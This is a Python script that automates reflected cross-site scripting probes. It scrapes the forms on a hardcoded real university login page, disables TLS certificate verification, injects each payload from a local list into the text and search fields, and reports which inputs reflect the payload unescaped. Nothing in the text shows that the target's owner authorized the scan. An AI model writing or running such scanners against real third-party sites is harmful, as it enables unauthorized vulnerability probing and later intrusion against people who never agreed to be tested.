import requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import re, sys

import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

defaults = {
    'checkbox':       'default',
    'color':          '%230f2bdb',
    'date':           '2021-07-08',
    'datetime':       '2021-07-09T20:20:34.32',
    'datetime-local': '2021-07-09T22:22',
    'file':           'pix.gif',
    'hidden':         'default',
    'email':           'test%40test.com',
    'month':          '1999-09',
    'number':         '1337',
    'password':       'password',
    'radio':          'beton',
    'range':          '37',
    'search':         'default',
    'submit':         'submit',
    'tel':            '0686868686',
    'time':           '12:21',
    'url':            'https://google.com/',
    'week':           '1999-W39',
    'text':           'default',
    'search':         'default'
}

def open_payload_file(file):
    fi = open(file, encoding="utf8")
    payload = set()
    x = fi.readline()
    while x:
        payload.add(x[:len(x)-1])
        x = fi.readline()
    return payload

def get_form(url, session):
    response = session.get(url, verify=False)
        
    soup = BeautifulSoup(response.text, "html.parser")
    if (not soup.findAll("form")):
        return None
    else:
        return soup.findAll("form")


def submit_form(session, url, form, payload):
    method = form.attrs.get("method")
    form_action = form.attrs.get("action")
            
    href = urljoin(url, form_action)
    parsed_href = urlparse(href)
            
    form_url = parsed_href.scheme + "://" + parsed_href.netloc + parsed_href.path
    if (parsed_href.query):
        form_url += "?" + parsed_href.query
    # print(form_url)
    
    response = {}
    data = {}
    for input_tag in form.findAll("input"):
        if (input_tag.attrs.get("type") in defaults):
            data[input_tag.attrs.get("name")] = defaults[input_tag.attrs.get("type")]
    
    for input_tag in form.findAll("input"):
        if (input_tag.get("type") == "text" or input_tag.get("type") == "search"):
            temp = data
            temp[input_tag.attrs.get("name")] = payload
            # print(temp)
            if (method == "post"):
                res = session.post(form_url, data=temp)
                response[input_tag.attrs.get("name")] = res
            else:
                res = session.get(form_url, params=temp)
                response[input_tag.attrs.get("name")] = res
    
    return response, form_url


def check_vuln(response, payload):
    soup = BeautifulSoup(response.text, "html.parser")
    if ( payload in soup.get_text()):
        return False
    else:
        if (payload in response.text):
            return True
        else:
            return False


if __name__ == '__main__':
    payload = open_payload_file("xssshort.txt")
    # print(payload)
    session = requests.Session()
    
    url = "https://daotao.vnu.edu.vn/dkmh/login.asp"
    form = get_form(url, session)
    if (not form):
        print("url has no form or connection err")
        sys.exit(-1)
    else:
        for pl in payload:
            vuln = False
            point = ""
            for fo in form:
                response, form_url = submit_form(session, url, fo, pl)
                for res in response.values():
                    if (check_vuln(res, pl)):
                        vuln = True
            if (vuln):
                print(form_url)
                print(pl)
                break
                